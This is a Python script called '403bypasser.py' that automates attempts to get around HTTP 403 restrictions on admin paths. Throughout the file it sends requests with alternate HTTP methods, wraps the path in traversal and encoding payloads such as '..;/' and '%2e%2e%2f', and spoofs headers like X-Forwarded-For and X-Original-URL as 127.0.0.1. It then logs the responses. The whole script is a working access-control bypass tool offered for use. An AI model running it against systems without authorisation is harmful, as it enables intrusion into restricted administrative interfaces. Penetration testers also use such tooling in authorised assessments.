# Note: this script will not run without providing 3 arguments like following
# python3 403bypasser.py http://example.com/ admin result.txt
# I modified the backslash in this script to be with url instead of "/admin" so i can run payloads befor word "admin"
# By default the output will append in result file.
import requests
import sys
import colorama
import time
from colorama import Fore, Style
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import requests
from bs4 import BeautifulSoup as bs


domain = sys.argv[1]
path = sys.argv[2]
output = sys.argv[3]
url=domain+path
payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23","?.css",".json",".jsp",".php",".asp",".html",".json?.css",".jsp?.css",".php?.css",".asp?.css",".html?.css"]
payloads2 = ["*","%2f/","./","./.","*/","&","%","%20","%09","..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%26","%23"]

# Bypass admin page Using different methods
print(Style.BRIGHT + Fore.RED + "Using different methods " + "\n")
res1 = requests.get(url, allow_redirects=False, verify=False, timeout= 5)
soup = bs(res1.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "using GET :" + "\t" + Fore.YELLOW + str(res1.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res1.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
#	print(soup.select_one('title').text)
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res2 = requests.post(url, allow_redirects=False, verify=False, timeout= 5)
soup = bs(res2.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN +"using POST :" + "\t" + Fore.YELLOW + str(res2.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res2.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res3 = requests.head(url, allow_redirects=False, verify=False, timeout= 5)
#soup = bs(res3.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "using HEAD :" + "\t" + Fore.YELLOW+ str(res3.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res3.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res4 = requests.put(url, allow_redirects=False, verify=False, timeout= 5)
soup = bs(res4.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN +"using PUT : "+ "\t" + Fore.YELLOW + str(res4.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res4.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res5 = requests.delete(url, allow_redirects=False, verify=False, timeout= 5)
soup = bs(res5.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN +"using DELETE :"+ "\t" + Fore.YELLOW+str(res5.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res5.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res6 = requests.patch(url, allow_redirects=False, verify=False, timeout= 5)
soup = bs(res6.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN +"using PATCH :" + "\t" + Fore.YELLOW+ str(res6.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res6.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

print(Style.BRIGHT + Fore.RED + "Using payloads at end of URL " + "\n")

# Bypass admin page with payloads after
for payload in payloads:
		try:
			url2 = url+payload
			res7 = requests.get(url2, allow_redirects=False , verify=False, timeout=5)
			soup = bs(res7.content, 'lxml')
			
			def out():
				print(Style.BRIGHT + Fore.GREEN + url2 + " : "+ Fore.YELLOW + str(res7.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res7.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
			out()
			# output redirect to 3rd argument
			original_stdout = sys.stdout
			with open(output, 'a') as f:
				sys.stdout = f
				out()
				sys.stdout = original_stdout
		except:
			pass

# Bypass admin page with payloads before
for pay1 in payloads2:
		try:
			url5 = domain+pay1+path
			res8 = requests.get(url5, allow_redirects=False , verify=False, timeout=5)
			soup = bs(res8.content, 'lxml')
			
			def out():
				print(Style.BRIGHT + Fore.GREEN + url5 + " : "+ Fore.YELLOW + str(res8.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res8.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
			out()
			# output redirect to 3rd argument
			original_stdout = sys.stdout
			with open(output, 'a') as f:
				sys.stdout = f
				out()
				sys.stdout = original_stdout
		except:
			pass

# Bypass admin page with payloads befor & after
for pay1 in payloads2:
	for payload in payloads:
		try:
			url6 = domain+pay1+path+payload
			res9 = requests.get(url6, allow_redirects=False , verify=False, timeout=5)
			soup = bs(res9.content, 'lxml')

			def out():
				print(Style.BRIGHT + Fore.GREEN + url6 + " : "+ Fore.YELLOW + str(res9.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res9.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
			out()
			# output redirect to 3rd argument
			original_stdout = sys.stdout
			with open(output, 'a') as f:
				sys.stdout = f
				out()
				sys.stdout = original_stdout
		except:
			pass

# Bypass admin page using Custom Headers
print(Style.BRIGHT + Fore.RED + "Using different headers " + "\n")		
res10 = requests.get(url, headers={'X-Forwarded-For':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res10.content, 'lxml')
def out():	
		print(Style.BRIGHT + Fore.GREEN + "X-Forwarded-For" + " : "+ Fore.YELLOW + str(res10.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res10.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res11 = requests.get(url, headers={'X-Forwarded-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res11.content, 'lxml')
def out():	
	print(Style.BRIGHT + Fore.GREEN + "X-Forwarded-Host" + " : "+ Fore.YELLOW + str(res11.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res11.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res12 = requests.get(url, headers={'X-Host':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res12.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "X-Host" + " : "+ Fore.YELLOW + str(res12.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res12.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res13 = requests.get(url, headers={'X-Custom-IP-Authorization':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res13.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "X-Custom-IP-Authorization" + " : "+ Fore.YELLOW + str(res13.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res13.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res14 = requests.get(url, headers={'X-Original-URL':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res14.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "X-Original-URL" + " : "+ Fore.YELLOW + str(res14.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res14.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res15 = requests.get(url, headers={'X-Originating-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res15.content, 'lxml')
def out():	
	print(Style.BRIGHT + Fore.GREEN + "X-Originating-IP" + " : "+ Fore.YELLOW + str(res15.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res15.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

res16 = requests.get(url, headers={'X-Remote-IP':'127.0.0.1'} , allow_redirects=False ,  verify=False)
soup = bs(res16.content, 'lxml')
def out():
	print(Style.BRIGHT + Fore.GREEN + "X-Remote-IP" + " : "+ Fore.YELLOW + str(res16.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res16.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

url3=domain+"/dev/null"
url4=path
res17 = requests.get(url3, headers={'X-Rewrite-URL':url4} , allow_redirects=False ,  verify=False)
soup = bs(res17.content, 'lxml')
def out():	
	print(Style.BRIGHT + Fore.GREEN + "X-Rewrite-URL" + " : "+ Fore.YELLOW + str(res17.status_code) + Fore.GREEN + " : " + Fore.YELLOW + str(len(res17.content)) + Fore.GREEN + " : " + Fore.YELLOW + str(soup.select_one('title').text))
out()
# output redirect to 3rd argument
original_stdout = sys.stdout
with open(output, 'a') as f:
	sys.stdout = f
	out()
	sys.stdout = original_stdout

print(Style.BRIGHT + Fore.RED + "finished automating . begin manual check . good luck " + "\n")
